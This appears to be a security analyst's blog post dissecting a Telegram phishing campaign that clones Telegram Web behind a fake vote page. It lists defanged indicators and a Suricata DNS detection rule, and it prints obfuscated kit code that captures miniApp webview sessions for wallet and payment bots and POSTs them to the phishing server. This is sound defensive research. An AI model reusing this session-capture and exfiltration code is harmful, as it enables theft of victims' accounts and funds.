---
layout: post
title: "A new telegram phishing campaign"
date: 2025-03-18 14:05:00 -0000
categories: phishing Telegram
---

## TLDR
### IOCs
**URLs**:
- hxxps[://]telegram[.]org-org[.]ru
- hxxps[://]tinyurl[.]com/gynecologmsc

**miniApps used**:
- hxxps[://]walletbot[.]me/wv
- hxxps[://]farm[.]joincommunity[.]xyz/waiting
- hxxps[://]app[.]send[.]tg/
- hxxps[://]telegram[.]blum[.]codes/

### Suricata rules
Unfortunately, since the website uses QUIC, the SNI is encrypted, so censoring such traffic is not possible, unless SSL offloading is used. Having that said, we can hopefully catch the unencrypted DNS queries:
```suricata
alert dns any any -> any any (msg:"Telegram phishing"; dns.query; content:"telegram.org-org"; nocase; threshold: type both, track by_src, count 1, seconds 120; reference:url,; classtype:bad-unknown; sid:1; rev:1;)
```
Lastly, there might be a chance catching this behavior via the miniApps being used. (Sorry, I don't have time to create and test the rules needed for this)

## Introduction
As a SOC analyst, I have read many blogs about phishing campaigns, malware, etc, however, I have never tried writing one. So, when I recently I saw a Telegram scam, I decided it would be a perfect opportunity for me to have some fun and learn something new. Hope you enjoy!
## Initial contact
The initial contact was with a Telegram message, as always:
![Telegram message](assets/img/telegram_message.png)
Translated, the message states:
```
Dear friends, good day! I would like to address you with an important request.  

The fact is that I am taking part in the contest “The Best Obstetrician-Gynecologist in Moscow”

For me it is very important, so I very much ask you to support me.
Thank you very much in advance to everyone who responded, have a good day!
```

So, of course I wanted to show my support: click the link (https://tinyurl[.]com/gynecologmsc), vote for my favorite, and you continue with my day!

However, there is a catch ... once the user tries to vote, the website prompts for a Telegram login "to combat cheating:
![Phishing Login](phishing_login.png)
(*The website is originally in Russian, however for the purpose of this blog, it was translated to English with Google Translate.*)

After that the user is presented with the default Telegram Web sign in and congratulates you once the user authenticates:
![Phishing success](phishing_success.png)

## Diving deeper
Looking deeper at the domain, neither of the popular search engines have indexed it. I used various queries, but nothing turned up:
- site:org-org.ru
- telegram.org-org
- telegram AND "org-org"
The IP belongs to cloudflare: https://www.shodan.io/host/172.67.219.87
and VirusTotal hasn't heard of it: https://www.virustotal.com/gui/url-analysis/u-18ac451554773db3c8fb7f6a6febc41275986f6d2a9987810787884e59235ed8-1742000651

Judging by the certificate, the campaign has been going for almost a month (https://crt.sh/?q=org-org.ru):

| crt.sh   ID | Logged   At  ⇧ | Not   Before | Not   After | Common Name |    Matching   Identities    |             Issuer   Name             |
| :---------: | :------------: | :----------: | :---------: | :---------: | :-------------------------: | :-----------------------------------: |
|  1.69E+10   |   28.2.2025    |  28.2.2025   |  29.5.2025  | org-org.ru  | \*.org-org.ru<br>org-org.ru | C=US, O=Google Trust Services, CN=WE1 |

### The URL
There is nothing special in the URL: hxxps[://]telegram[.]org-org[.]ru/gynecologmsc/vts/Bsb6Uyd= 
The only interesting thing is the last part, which is an ID, dynamically allocated per connection on the server side (as it is already hardcoded in the JS code):
```js
  content.querySelector(".evgjcunq_ilEoAQHN").addEventListener("click", () => {
    window.location.href = "/gynecologmsc/vts/Yzh7qjW";
    closePopup();
  });
```

### Logging into Telegram
The website seems to be a direct copy of the Telegram Web service, however, the code is obfuscated, for the fun of security researchers. 
For example, this is how Telegram handles the response from the server once the user authenticates:
```js
    switch(response._) {
      case 'auth.authorization':
        await rootScope.managers.apiManager.setUser(response.user);

        import('./pageIm').then((m) => {
          m.default.mount();
        });
        cleanup();
        break;
      case 'auth.authorizationSignUpRequired':
        // console.log('Registration needed!');

        import('./pageSignUp').then((m) => {
          m.default.mount({
            'phone_number': authSentCode.phone_number,
            'phone_code_hash': authSentCode.phone_code_hash
          });
        });

        cleanup();
        break;
      /* default:
        codeInput.innerText = response._;
        break; */
    }
```
and this is how the phishing website does it:
```js
        switch (_0x2a70c0['_']) {
        case _0x346efe(0x1e2):
            await a33_0x56b87e[_0x346efe(0x202)][_0x346efe(0x1fc)][_0x346efe(0x21e)](_0x2a70c0['user']),
            a33_0x15d5ee( () => import('./2xdtpe8hc3yy.js'), __vite__mapDeps([0x0, 0x1, 0x2, 0x3, 0x4]), import.meta[_0x346efe(0x1ec)])['then'](_0x1548e6 => {
                const _0x379d7d = _0x346efe;
                _0x1548e6[_0x379d7d(0x20c)]['mount']();
            }
            ),
            v();
            break;
        case _0x346efe(0x238):
            a33_0x15d5ee( () => import(_0x346efe(0x205)), __vite__mapDeps([0x5, 0x1, 0x2, 0x6, 0x3, 0x7, 0x8, 0x9, 0xa, 0xb, 0x4]), import.meta[_0x346efe(0x1ec)])[_0x346efe(0x1d8)](_0x565fa1 => {
                const _0x2ed909 = _0x346efe;
                _0x565fa1[_0x2ed909(0x20c)][_0x2ed909(0x22a)]({
                    'phone_number': r[_0x2ed909(0x1fd)],
                    'phone_code_hash': r[_0x2ed909(0x21b)]
                });
            }
            ),
            v();
            break;
        }
    }
```
Looking deeper into the Telegram login code, the code fetches the page from `./pageIm` and loads it:
```js
  public async mount(...args: any[]) {
    // this.pageEl.style.display = '';

    if(this.onMount) {
      const res = this.onMount(...args);
      if(res instanceof Promise) {
        await res;
      }
    }

    this.installPromise ??= this.install(...args);
    await this.installPromise;

    pagesManager.setPage(this);
  }
```
However, this is where the phishing website loads a different page (located at `./2xdtpe8hc3yy.js`)
### MiniApps
The code enrolls the user for a couple of Telegram miniApps via the [messages.requestWebView](https://core.telegram.org/method/messages.requestWebView)API endpoint and sends the response back to the server. Now you might ask, why the heck should I care about those miniApps, so let me copy-paste the Telegram explanation:
```
Interactive [HTML5 Mini Apps](https://core.telegram.org/bots/webapps) on Telegram can completely replace **any website**.

They support [seamless authorization](https://telegram.org/blog/privacy-discussions-web-bots#meet-seamless-web-bots), [integrated payments](https://core.telegram.org/bots/payments) via multiple payment providers (with _Google Pay_ and _Apple Pay_ out of the box), delivering tailored push notifications to users, and [much more](https://core.telegram.org/bots).
```
So they allow **integrated payments, seamless authorization and much more** (Yay!).

The following miniApps are used:
- hxxps[://]walletbot[.]me/wv
- hxxps[://]farm[.]joincommunity[.]xyz/waiting
- hxxps[://]app[.]send[.]tg/
- hxxps[://]telegram[.]blum[.]codes/

For each miniApp, the code is fetched and then pushed to an array of objects, each containing a user and the miniApp response:
```js
          a1_0x505657.managers.appAttachMenuBotsManager.requestWebView({
            'botId': _0xa8a0cd.id,
            'peerId': +_0xa8a0cd.id,
            'url': "https://walletbot.me/wv",
            'fromBotMenu': false,
            'hash': _0x4906b6,
            'platform': "ios"
          }).then(_0x37e995 => {
            var _0x13b1d9 = _0x387b9e(JSON.stringify({
              'user': a1_0x505657.myId,
              'message': btoa(encodeURI(_0x37e995.url.substring(0x14)))
            }));
            _0x417166.push(btoa(_0x13b1d9));
          }
```
Afterwards, the data is POSTed to the server:
```js
w.post('/' + _0x37c264() + "/receive/" + _0x37c264(), {
              'image': btoa(_0x7c3357)
            }, {
              'headers': {
                'Content-Type': "application/json"
              }
            })["catch"]();
```

The full URL of the POST looks like this:
```
hxxps[://]telegram[.]org-org[.]ru/j4xQW/flow/0hhGae3FlGTazt
```
However the two random-looking bits from the URL do not matter, as they are randomly generated, as we can see from the way the URL is created:
```js
      var _0x1251db = encodeURIComponent(JSON.stringify({
        'salt': _0x5a9359,
        'key': _0x229cf2
      }));
      var _0x2a9f54 = _0x387b9e(_0x1251db);
      w.post('/' + _0x37c264() + "/settings/" + _0x37c264(), {
        'image': btoa(_0x2a9f54)
      }
```
Calling the function to generate strings of random length twice:
```js
  function _0x37c264() {
    let _0x29c678 = '';
    const _0x165d98 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
    let _0x1ff2ca = 0x0;
    let _0x1f496a = Math.floor(Math.random() * 0xa) + 0x5;
    for (; _0x1ff2ca < _0x1f496a;) {
      _0x29c678 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * _0x165d98));
      _0x1ff2ca += 0x1;
    }
    return _0x29c678;
  }
```

Each miniApp response is POSTed to a different endpoint:
- hxxps[://]walletbot[.]me/wv -> `/images/`
- hxxps[://]farm[.]joincommunity[.]xyz/waiting -> `/imagess/`
- hxxps[://]telegram[.]blum[.]codes/ -> `/flow/`
- hxxps[://]app[.]send[.]tg/ -> `/receive/`
- Key and salt -> `/settings/`

As every great story ends, `The Rest Is History`.